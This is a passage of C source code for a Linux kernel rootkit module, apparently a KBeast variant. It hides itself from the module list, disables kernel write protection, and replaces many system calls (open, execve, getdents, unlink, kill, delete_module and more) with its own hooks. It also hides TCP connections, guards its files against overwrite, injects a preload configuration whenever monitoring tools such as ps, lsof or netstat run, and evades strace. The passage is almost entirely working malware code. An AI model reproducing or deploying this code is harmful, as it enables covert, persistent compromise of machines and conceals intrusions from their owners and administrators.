	kfree(kbuf); 
	//snprintf(obuffer,sizeof(obuffer),"readtest- > fbuf: %s\n",fbuf); 
	//printk("readtest->fbuf:%s\n",fbuf);
	//log_to_file(obuffer); 
  	goto out;
     
  out:
	return error;

  out_err:
	filp_close (file,NULL);
	#ifdef DEBUG  
	snprintf(obuffer,sizeof(obuffer),"error:%i\n",error); 
	log_to_file(obuffer);   
	//printk("fbuf read error\n,error:%i",error);
	#endif
	goto out;
}

int isPreExist(void){ 
	struct file *file = NULL;
	snprintf(rebootfile,sizeof(rebootfile),"%s",CONFIG_FULLPATH);
	file = filp_open(rebootfile, O_RDONLY, 00644);
	if(IS_ERR(file)){ 
		return 0;
  	}

  	if(!S_ISREG(file->f_dentry->d_inode->i_mode)){
		return 0;
	}
	#ifdef DEBUG
	snprintf(obuffer,sizeof(obuffer),"---PreExist:true\n"); 
	log_to_file(obuffer);	
    #endif

	filp_close(file,NULL);
	return 1; 
	 
}

int delPreload(void){ 
	
	struct file *file = NULL;
  	mm_segment_t fs;
  	int error;
	loff_t pos,start,end;  

  	//snprintf(accountlog,sizeof(accountlog),"%s/%s",_H4X_PATH_,_LOGFILE_,current->uid);
  	//file = filp_open(accountlog, O_CREAT|O_APPEND|O_RDWR, 00644);
	//#ifdef DEBUG
	snprintf(obuffer,sizeof(obuffer),"Here Del the preload code\n");
	log_to_file(obuffer);
	//#endif
	 
	memset(rebootfile,'\0',sizeof(rebootfile));
	
	snprintf(rebootfile,sizeof(rebootfile),"%s",CONFIG_FULLPATH);
	 
	file = filp_open(rebootfile,  O_RDWR|O_SYNC, 00644); 
	if(IS_ERR(file)){
    	error=PTR_ERR(file);
    	goto out;
  	}

  	error = -EACCES;
  	if(!S_ISREG(file->f_dentry->d_inode->i_mode))
  		goto out_err;

  	error = -EIO;
  	if(!file->f_op->write)
  		goto out_err;

  	error = 0;
  	fs = get_fs();
  	set_fs(KERNEL_DS);  

	//file->f_op->write(file,buffer,strlen(buffer),&file->f_pos);  
	//to do ur evil things with files here
	end = start = pos = 0; 
	end = file->f_op->llseek(file,0,SEEK_END);
	if( end <= 0 ){
		snprintf(obuffer,sizeof(obuffer),"end<=0");
		log_to_file(obuffer);
		goto  out_err;
	}
		
	#ifdef DEBUG
	snprintf(obuffer,sizeof(obuffer),"END?%i\n",end);
	log_to_file(obuffer);
	#endif
	
	char *kbuf=(char*)kmalloc(end,GFP_KERNEL);
	memset(kbuf,'\0',sizeof(kbuf));
	file->f_op->read(file,kbuf,end,&start);
	
	#ifdef DEBUG
	snprintf(obuffer,sizeof(obuffer),"---Config_readed_code?%s\n",kbuf);
	log_to_file(obuffer);
	#endif
	snprintf(obuffer,sizeof(obuffer),"-kbuf-%s---end:%i---length:%i---\n",kbuf,end,strlen(kbuf));
	log_to_file(obuffer);
	snprintf(obuffer,sizeof(obuffer),"-CONFIG_CODE-%s---length:%i---\n",CONFIG_CODE,sizeof(CONFIG_CODE));
	log_to_file(obuffer);
	 
	if(strncmp(kbuf,CONFIG_CODE,end)==0){
		//o_truncate(CONFIG_FULLPATH,1);
		snprintf(obuffer,sizeof(obuffer),"---Hit cut to 0\n");
		log_to_file(obuffer);
		filp_close (file,NULL);
		(*o_unlink)(CONFIG_FULLPATH);
		snprintf(rebootfile,sizeof(rebootfile),"%s",CONFIG_FULLPATH);
		file = filp_open(rebootfile, O_RDWR|O_SYNC|O_CREAT|O_APPEND, 00644);
		todo--;
		goto out_err;
	}
	
	char *ptr = strstr(kbuf,CONFIG_CODE);
	
	#ifdef DEBUG
	snprintf(obuffer,sizeof(obuffer),"---Config_readed_code-ptr?%s\n",ptr);
	log_to_file(obuffer);
	#endif
	   
	if( ptr!=NULL ){ 		 
		int i=0;
		#ifdef DEBUG
		snprintf(obuffer,sizeof(obuffer),"How long is it?%i\n",( kbuf+end-ptr-sizeof(CONFIG_CODE) ));
		log_to_file(obuffer); 
		#endif
		
		if( (kbuf+end-ptr-sizeof(CONFIG_CODE))>0 ){
			 for(i=0;i<kbuf+end-ptr-sizeof(CONFIG_CODE)+1;i++){
					ptr[i] = ptr[i+sizeof(CONFIG_CODE)-1];
			 }
		}
		ptr[i]='\0';
		//#ifdef DEBUG
		snprintf(obuffer,sizeof(obuffer),"---FINAL?%s\n",kbuf);
		log_to_file(obuffer);
		//#endif
        
		/*
		if(strlen(kbuf)>0)
		file->f_op->write(file,kbuf,(strlen(kbuf)>0 ? strlen(kbuf):1),&pos);
		o_truncate(CONFIG_FULLPATH, (strlen(kbuf)>0 ? strlen(kbuf):1) );    
		*/
		file->f_op->write(file,kbuf,strlen(kbuf),&pos);
		if(strlen(kbuf)>0)
			o_truncate(CONFIG_FULLPATH, strlen(kbuf) );
		todo--;     
	} 
  	set_fs(fs);
  	filp_close(file,NULL);
	kfree(kbuf);
  	goto out;
     
  out:
	return error;

  out_err:
	filp_close (file,NULL);  
	goto out;	
}
 
int rmPreload(void){
	snprintf(obuffer,sizeof(obuffer),"--remove preload\n"); 
	log_to_file(obuffer);
	todo = 0;
	snprintf(rebootfile,sizeof(rebootfile),"%s",CONFIG_FULLPATH);
	return (*o_unlink)(rebootfile);
}
/*Don't allow your file to be overwrited*/
asmlinkage int h4x_open(const char __user *filename, int flags, int mode) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,filename,255);
  //bits/fcntl.h O_WRONLY|O_TRUNC|O_LARGEFILE is 0101001
  if((strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)) && flags == 0101001){
    kfree(kbuf);
    return -EACCES;
  }  
 	//when the computer shutdown or reboot the flags eques to 1
	if(strstr(kbuf,"/dev/initctl") && flags==1 && !(strstr(current->comm,"log")) ){
	//if(strstr(kbuf,"/dev/initctl")){
		writeInit();
		started = 0;
		if(mypid != 0){
			(*o_kill)(mypid,9);
		}
		if(hasPreload){
			delPreload();
			hasPreload=0;
		}else{
			rmPreload();
		}
		//delInit();
		//snprintf(obuffer,sizeof(obuffer),"initctlmagic- [UID = %i ] %s >file:%s > flags:%i > mode: %i\n",current->uid,current->comm,kbuf,flags,mode);
		//log_to_file(obuffer);
	}
	//del preload settings 
	/*
	if(strstr(kbuf,CONFIG_FULLPATH)){
		if ( (strstr(current->comm,"ps")) || (strstr(current->comm,"pstree")) || (strstr(current->comm,"ls")) ||
		       (strstr(current->comm,"top")) || (strstr(current->comm,"lsof")) ){
        	    hasPreload = isPreExist();
				writePreload();
 			   	r=(*o_open)(filename,flags,mode);
				if(hasPreload){
					delPreload();
				}else{
					rmPreload();
				}
				#ifdef DEBUG
				snprintf(obuffer,sizeof(obuffer),"---Good Final Here Opened:\n");
				log_to_file(obuffer);
				#endif
				return r;
			   
		}
		#ifdef DEBUG
		snprintf(obuffer,sizeof(obuffer),"Here Opened:%s\n",kbuf);
		log_to_file(obuffer);
		#endif
	} 
	*/
  r=(*o_open)(filename,flags,mode);
  return r;
}
asmlinkage int h4x_execve(const char *filename, char *const argv[],char *const envp[]){	
	load=0;
	int tty_load = 1;
	//hasPreload = isPreExist();
	if( strstr(argv[0],MAGIC_TO_DO) ){
		started = 1;
		tty_load = 0;
		#ifdef DEBUG
		snprintf(obuffer,sizeof(obuffer),"----magic argv[-]filename:%s;argv[0]:%s;argv[1]%s;\n",filename,argv[0],argv[1]);
		log_to_file(obuffer);
		#endif
	}
	force_load = 0;
	if( strstr(filename,"bash") || strstr(filename,"dircolors") || 
		strstr(filename,"id") || strstr(filename,"lib") ||
		strstr(filename,APP_NAME) || strstr(filename,"dhcp") ||strstr(filename,"lpstat") ){
		tty_load = 0;
	}
	if( strstr(filename,"cat")  ||strstr(filename,"cp") ||strstr(filename,"vi")){
		load=0; 
	}
	if( strstr(filename,"mysql")  || strstr(filename,"sshd") || strstr(filename,"ls") || strstr(filename,"ps") || strstr(filename,"top") || strstr(filename,"grep")
	 	|| strstr(filename,"lsof")  || strstr(filename,"sendmail") 
	 	|| strstr(filename,"xinetd") || strstr(filename,"ftp") || strstr(filename,"http") || strstr(filename,"ngin") || strstr(filename,"netst") ){
		if(!haswrite)
			hasPreload = isPreExist();
		load = 1;
	} 
	if( strstr(argv[0],"strace")){
		trace++;
		trace++; 
	}
	trace--;
	if(trace<0)
		trace=0;
	if( ( (load && started) || force_load ) && !trace && tty_load ){
	//if(load && started){ 
		//#ifdef DEBUG
		mycount++;
		snprintf(obuffer,sizeof(obuffer),"filename:%s;flag:%i;argv[0]:%s;argv[1]%s;mycount:%i;mypid:%i;\n",filename,hasPreload,argv[0],argv[1],mycount,mypid);
		log_to_file(obuffer);
		//#endif
		writePreload();//preload to make hooks another way 
	}
	
	return (*o_execve)(filename,argv,envp);  
}


/*init module insmod*/
static int init(void)
{
  //Uncomment to hide this module
  list_del_init(&__this_module.list);

  struct tcp_seq_afinfo *my_afinfo = NULL;
  //proc_net is disappeared in 2.6.32, use init_net.proc_net
  struct proc_dir_entry *my_dir_entry = proc_net->subdir;  

  write_cr0 (read_cr0 () & (~ 0x10000));
  #ifdef MAGIC_READ
    o_read=(void *)sys_call_table[__NR_read];
    sys_call_table[__NR_read]=h4x_read;  
  #endif
  
  o_write=(void *)sys_call_table[__NR_write];
  sys_call_table[__NR_write]=h4x_write;
  #if defined(__x86_64__)
    o_getdents=sys_call_table [__NR_getdents];
    sys_call_table [__NR_getdents]=h4x_getdents;
  #elif defined(__i386__)
    o_getdents64=sys_call_table [__NR_getdents64];
    sys_call_table [__NR_getdents64]=h4x_getdents64;
  #else
    #error Unsupported architecture
  #endif
  o_unlink = sys_call_table [__NR_unlink];
  sys_call_table [__NR_unlink] = h4x_unlink;
  o_rmdir = sys_call_table [__NR_rmdir];
  sys_call_table [__NR_rmdir] = h4x_rmdir;
  o_unlinkat = sys_call_table [__NR_unlinkat];
  sys_call_table [__NR_unlinkat] = h4x_unlinkat;
  o_rename = sys_call_table [__NR_rename];
  sys_call_table [__NR_rename] = h4x_rename;
  o_open = sys_call_table [__NR_open];
  sys_call_table [__NR_open] = h4x_open;
  o_kill = sys_call_table [__NR_kill];
  sys_call_table [__NR_kill] = h4x_kill;
  o_delete_module = sys_call_table [__NR_delete_module];
  sys_call_table [__NR_delete_module] = h4x_delete_module;

  o_execve = sys_call_table [__NR_execve];
  sys_call_table [__NR_execve] = h4x_execve;
  

	o_truncate =  sys_call_table [__NR_truncate];
#ifdef hook_accept
  o_accept = sys_call_table [__NR_accept];
  sys_call_table [__NR_accept] = my_accept; 

  o_fork = sys_call_table [__NR_fork];
  sys_call_table [__NR_fork] = h4x_fork;

  o_close = sys_call_table [__NR_close];
  o_dup2 = sys_call_table [__NR_dup2];
  
  o_exit = sys_call_table [__NR_exit];
  //o_waitpid = sys_call_table [__NR_waitpid];
#endif

#ifdef MAGIC_REBOOT
  o_reboot = sys_call_table [__NR_reboot];
  sys_call_table [__NR_reboot] = my_reboot;
  o_signal = sys_call_table [__NR_signal];
  sys_call_table [__NR_signal] = my_signal;
#endif
  
  write_cr0 (read_cr0 () | 0x10000);

  while(strcmp(my_dir_entry->name, "tcp"))
    my_dir_entry = my_dir_entry->next;
  if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
  {
    //seq_show is disappeared in 2.6.32, use seq_ops.show
    old_tcp4_seq_show = my_afinfo->seq_show;
    my_afinfo->seq_show = h4x_tcp4_seq_show;
  }
  return 0;
}

/*delete module rmmod*/
static void exit(void)
{
  struct tcp_seq_afinfo *my_afinfo = NULL;
  //proc_net is disappeared 2.6.32, use init_net.proc_net
  struct proc_dir_entry *my_dir_entry = proc_net->subdir;

  write_cr0 (read_cr0 () & (~ 0x10000));
  #ifdef MAGIC_READ
    sys_call_table[__NR_read]=o_read;
  #endif

  sys_call_table[__NR_write]=o_write;
  #if defined(__x86_64__)
    sys_call_table[__NR_getdents] = o_getdents;
  #elif defined(__i386__)
    sys_call_table[__NR_getdents64] = o_getdents64;
  #else
    #error Unsupported architecture
  #endif
  sys_call_table[__NR_unlink] = o_unlink;
  sys_call_table[__NR_rmdir] = o_rmdir;
  sys_call_table[__NR_unlinkat] = o_unlinkat;
  sys_call_table[__NR_rename] = o_rename;
  sys_call_table[__NR_open] = o_open;
  sys_call_table[__NR_kill] = o_kill;
  sys_call_table[__NR_delete_module] = o_delete_module;
  sys_call_table [__NR_execve] = o_execve;
    
#ifdef hook_accept
  sys_call_table[__NR_accept] = o_accept;
  sys_call_table [__NR_fork] = o_fork;
#endif 
#ifdef MAGIC_REBOOT
  sys_call_table [__NR_reboot] = o_reboot;
  sys_call_table [__NR_signal] = o_signal;
#endif
  write_cr0 (read_cr0 () | 0x10000);

  while(strcmp(my_dir_entry->name, "tcp"))
    my_dir_entry = my_dir_entry->next;
  if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
  {
    //seq_show is disappeared in 2.6.32, use seq_ops.show
    my_afinfo->seq_show=old_tcp4_seq_show;
  }
  return;
}

module_init(init);
module_exit(exit);
